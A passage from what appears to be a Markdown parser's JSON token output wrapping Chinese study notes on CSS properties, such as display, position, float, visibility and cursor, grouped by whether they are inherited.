定位时，指定元素相对于其定位上下文的偏移量\\n\\n+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    none：允许两侧都有浮动元素\\n\\n+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n","tokens":[{"type":"text","raw":"**1：** 不可继承的","text":"**1：** 不可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不可继承的","text":" 不可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n+ height\\n  指定元素的高度\\n\\n+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n+ width\\n  指定元素的宽度\\n\\n+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n+ top, bottom, left, right\\n  当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    none：允许两侧都有浮动元素\\n\\n+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ display\\n  指定元素的显示方式，常见的值包括：\\n  block：块级元素，占据整行\\n  inline：行内元素，只占据必要的宽度，不换行\\n  inline-block：结合了 inline 和 block 的特性\\n  none：隐藏元素\\n\\n","task":false,"loose":true,"text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素\\n","tokens":[{"type":"text","raw":"display\\n\\n指定元素的显示方式，常见的值包括：\\n\\nblock：块级元素，占据整行\\n\\ninline：行内元素，只占据必要的宽度，不换行\\n\\ninline-block：结合了 inline 和 block 的特性\\n\\nnone：隐藏元素\\n","text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","tokens":[{"type":"text","raw":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","text":"display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素","escaped":false}]}]},{"type":"list_item","raw":"+ margin\\n  设置元素外部的空白区域，即元素与其他元素之间的距离\\n\\n","task":false,"loose":true,"text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离\\n","tokens":[{"type":"text","raw":"margin\\n\\n设置元素外部的空白区域，即元素与其他元素之间的距离\\n","text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","tokens":[{"type":"text","raw":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","text":"margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离","escaped":false}]}]},{"type":"list_item","raw":"+ border\\n  设置元素的边框可以指定边框的宽度、样式和颜色\\n\\n","task":false,"loose":true,"text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色\\n","tokens":[{"type":"text","raw":"border\\n\\n设置元素的边框可以指定边框的宽度、样式和颜色\\n","text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","tokens":[{"type":"text","raw":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","text":"border\\n设置元素的边框可以指定边框的宽度、样式和颜色","escaped":false}]}]},{"type":"list_item","raw":"+ padding\\n  设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n\\n","task":false,"loose":true,"text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n","tokens":[{"type":"text","raw":"padding\\n\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域\\n","text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","tokens":[{"type":"text","raw":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","text":"padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域","escaped":false}]}]},{"type":"list_item","raw":"+ background\\n  设置元素的背景，包括背景颜色、背景图像等\\n\\n","task":false,"loose":true,"text":"background\\n设置元素的背景，包括背景颜色、背景图像等\\n","tokens":[{"type":"text","raw":"background\\n\\n设置元素的背景，包括背景颜色、背景图像等\\n","text":"background\\n设置元素的背景，包括背景颜色、背景图像等","tokens":[{"type":"text","raw":"background\\n设置元素的背景，包括背景颜色、背景图像等","text":"background\\n设置元素的背景，包括背景颜色、背景图像等","escaped":false}]}]},{"type":"list_item","raw":"+ height\\n  指定元素的高度\\n\\n","task":false,"loose":true,"text":"height\\n指定元素的高度\\n","tokens":[{"type":"text","raw":"height\\n\\n指定元素的高度\\n","text":"height\\n指定元素的高度","tokens":[{"type":"text","raw":"height\\n指定元素的高度","text":"height\\n指定元素的高度","escaped":false}]}]},{"type":"list_item","raw":"+ min-height\\n  设置元素的最小高度，元素的高度不能小于此值\\n\\n","task":false,"loose":true,"text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值\\n","tokens":[{"type":"text","raw":"min-height\\n\\n设置元素的最小高度，元素的高度不能小于此值\\n","text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","tokens":[{"type":"text","raw":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","text":"min-height\\n设置元素的最小高度，元素的高度不能小于此值","escaped":false}]}]},{"type":"list_item","raw":"+ max-height\\n  设置元素的最大高度，元素的高度不能超过此值\\n\\n","task":false,"loose":true,"text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值\\n","tokens":[{"type":"text","raw":"max-height\\n\\n设置元素的最大高度，元素的高度不能超过此值\\n","text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","tokens":[{"type":"text","raw":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","text":"max-height\\n设置元素的最大高度，元素的高度不能超过此值","escaped":false}]}]},{"type":"list_item","raw":"+ width\\n  指定元素的宽度\\n\\n","task":false,"loose":true,"text":"width\\n指定元素的宽度\\n","tokens":[{"type":"text","raw":"width\\n\\n指定元素的宽度\\n","text":"width\\n指定元素的宽度","tokens":[{"type":"text","raw":"width\\n指定元素的宽度","text":"width\\n指定元素的宽度","escaped":false}]}]},{"type":"list_item","raw":"+ min-width\\n  设置元素的最小宽度，元素的宽度不能小于此值\\n\\n","task":false,"loose":true,"text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值\\n","tokens":[{"type":"text","raw":"min-width\\n\\n设置元素的最小宽度，元素的宽度不能小于此值\\n","text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","tokens":[{"type":"text","raw":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","text":"min-width\\n设置元素的最小宽度，元素的宽度不能小于此值","escaped":false}]}]},{"type":"list_item","raw":"+ max-width\\n  设置元素的最大宽度，元素的宽度不能超过此值\\n\\n","task":false,"loose":true,"text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值\\n","tokens":[{"type":"text","raw":"max-width\\n\\n设置元素的最大宽度，元素的宽度不能超过此值\\n","text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","tokens":[{"type":"text","raw":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","text":"max-width\\n设置元素的最大宽度，元素的宽度不能超过此值","escaped":false}]}]},{"type":"list_item","raw":"+ overflow\\n  控制当内容溢出元素的边界时如何显示常见的值：\\n    visible：内容溢出时可见\\n    hidden：内容溢出时隐藏\\n    scroll：出现滚动条\\n    auto：根据需要自动显示滚动条\\n\\n","task":false,"loose":true,"text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条\\n","tokens":[{"type":"text","raw":"overflow\\n\\n控制当内容溢出元素的边界时如何显示常见的值：\\n\\n  visible：内容溢出时可见\\n\\n  hidden：内容溢出时隐藏\\n\\n  scroll：出现滚动条\\n\\n  auto：根据需要自动显示滚动条\\n","text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","tokens":[{"type":"text","raw":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","text":"overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条","escaped":false}]}]},{"type":"list_item","raw":"+ position\\n  设置元素的定位方式常见的值：\\n    static：默认值，元素按文档流排列\\n    relative：相对定位，元素相对于其原始位置偏移\\n    absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n    fixed：固定定位，元素相对于浏览器窗口定位\\n    sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n\\n","task":false,"loose":true,"text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n","tokens":[{"type":"text","raw":"position\\n\\n设置元素的定位方式常见的值：\\n\\n  static：默认值，元素按文档流排列\\n\\n  relative：相对定位，元素相对于其原始位置偏移\\n\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位\\n","text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","tokens":[{"type":"text","raw":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","text":"position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位","escaped":false}]}]},{"type":"list_item","raw":"+ top, bottom, left, right\\n  当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n\\n","task":false,"loose":true,"text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n","tokens":[{"type":"text","raw":"top, bottom, left, right\\n\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量\\n","text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","tokens":[{"type":"text","raw":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","text":"top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量","escaped":false}]}]},{"type":"list_item","raw":"+ z-index\\n  控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n\\n","task":false,"loose":true,"text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n","tokens":[{"type":"text","raw":"z-index\\n\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效\\n","text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","tokens":[{"type":"text","raw":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","text":"z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效","escaped":false}]}]},{"type":"list_item","raw":"+ float\\n  指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n    left：元素向左浮动\\n    right：元素向右浮动\\n    none：取消浮动\\n\\n","task":false,"loose":true,"text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动\\n","tokens":[{"type":"text","raw":"float\\n\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n\\n  left：元素向左浮动\\n\\n  right：元素向右浮动\\n\\n  none：取消浮动\\n","text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","tokens":[{"type":"text","raw":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","text":"float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动","escaped":false}]}]},{"type":"list_item","raw":"+ clear\\n  控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n    left：禁止元素左侧有浮动元素\\n    right：禁止元素右侧有浮动元素\\n    both：禁止元素两侧有浮动元素\\n    none：允许两侧都有浮动元素\\n\\n","task":false,"loose":true,"text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素\\n","tokens":[{"type":"text","raw":"clear\\n\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n\\n  left：禁止元素左侧有浮动元素\\n\\n  right：禁止元素右侧有浮动元素\\n\\n  both：禁止元素两侧有浮动元素\\n\\n  none：允许两侧都有浮动元素\\n","text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","tokens":[{"type":"text","raw":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","text":"clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素","escaped":false}]}]},{"type":"list_item","raw":"+ table-layout\\n  控制表格布局的算法常见的值：\\n    auto：浏览器根据内容调整列宽（默认）\\n    fixed：浏览器根据表格的宽度固定列宽\\n\\n","task":false,"loose":true,"text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽\\n","tokens":[{"type":"text","raw":"table-layout\\n\\n控制表格布局的算法常见的值：\\n\\n  auto：浏览器根据内容调整列宽（默认）\\n\\n  fixed：浏览器根据表格的宽度固定列宽\\n","text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","tokens":[{"type":"text","raw":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","text":"table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽","escaped":false}]}]},{"type":"list_item","raw":"+ vertical-align\\n  控制元素在垂直方向上的对齐方式常见的值：\\n    top：元素顶部对齐\\n    middle：元素垂直居中对齐\\n    bottom：元素底部对齐\\n\\n","task":false,"loose":true,"text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐\\n","tokens":[{"type":"text","raw":"vertical-align\\n\\n控制元素在垂直方向上的对齐方式常见的值：\\n\\n  top：元素顶部对齐\\n\\n  middle：元素垂直居中对齐\\n\\n  bottom：元素底部对齐\\n","text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","tokens":[{"type":"text","raw":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","text":"vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐","escaped":false}]}]},{"type":"list_item","raw":"+ page-break-after\\n  控制分页符的位置常见的值：\\n    auto：默认，自动决定分页\\n    always：强制分页\\n    avoid：避免分页\\n\\n","task":false,"loose":true,"text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页\\n","tokens":[{"type":"text","raw":"page-break-after\\n\\n控制分页符的位置常见的值：\\n\\n  auto：默认，自动决定分页\\n\\n  always：强制分页\\n\\n  avoid：避免分页\\n","text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","tokens":[{"type":"text","raw":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","text":"page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页","escaped":false}]}]},{"type":"list_item","raw":"+ page-break-before\\n  与 page-break-after 类似，控制元素前面的分页符\\n\\n","task":false,"loose":true,"text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符\\n","tokens":[{"type":"text","raw":"page-break-before\\n\\n与 page-break-after 类似，控制元素前面的分页符\\n","text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","tokens":[{"type":"text","raw":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","text":"page-break-before\\n与 page-break-after 类似，控制元素前面的分页符","escaped":false}]}]},{"type":"list_item","raw":"+ unicode-bidi\\n  控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n    normal：正常的双向文本布局\\n    embed：强制嵌入的文本遵循本地的方向性\\n    bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","task":false,"loose":true,"text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","tokens":[{"type":"text","raw":"unicode-bidi\\n\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n\\n  normal：正常的双向文本布局\\n\\n  embed：强制嵌入的文本遵循本地的方向性\\n\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","tokens":[{"type":"text","raw":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","text":"unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 所有元素可继承的\\n\\n  + visibility\\n    visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n    常见值包括：\\n      visible（默认值）：元素是可见的\\n      hidden：元素不可见，但仍然占据空间\\n      collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n  + cursor\\n    cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n    常见值包括：\\n      auto：默认指针，浏览器根据上下文决定指针样式\\n      pointer：显示手形指针，通常用于可点击的链接或按钮\\n      default：默认的光标样式\\n      none：隐藏鼠标指针\\n      wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n      move：显示一个四向箭头，表示可以移动元素\\n      text：显示文本光标，通常用于文本输入区域\\n      not-allowed：显示禁用的指针，通常表示该操作不可用\\n      help：显示问号光标，通常表示需要帮助的地方\\n\\n","task":false,"loose":true,"text":"**1：** 所有元素可继承的\\n\\n+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方\\n","tokens":[{"type":"text","raw":"**1：** 所有元素可继承的","text":"**1：** 所有元素可继承的","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 所有元素可继承的","text":" 所有元素可继承的","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n    move：显示一个四向箭头，表示可以移动元素\\n    text：显示文本光标，通常用于文本输入区域\\n    not-allowed：显示禁用的指针，通常表示该操作不可用\\n    help：显示问号光标，通常表示需要帮助的地方\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ visibility\\n  visibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n  常见值包括：\\n    visible（默认值）：元素是可见的\\n    hidden：元素不可见，但仍然占据空间\\n    collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n\\n","task":false,"loose":true,"text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n","tokens":[{"type":"text","raw":"visibility\\n\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n\\n常见值包括：\\n\\n  visible（默认值）：元素是可见的\\n\\n  hidden：元素不可见，但仍然占据空间\\n\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）\\n","text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 `<tr>、<th>、<td>` 等表格元素）","tokens":[{"type":"text","raw":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 ","text":"visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 ","escaped":false},{"type":"codespan","raw":"`<tr>、<th>、<td>`","text":"<tr>、<th>、<td>"},{"type":"text","raw":" 等表格元素）","text":" 等表格元素）","escaped":false}]}]},{"type":"list_item","raw":"+ cursor\\n  cursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n  常见值包括：\\n    auto：默认指针，浏览器根据上下文决定指针样式\\n    pointer：显示手形指针，通常用于可点击的链接或按钮\\n    default：默认的光标样式\\n    none：隐藏鼠标指针\\n    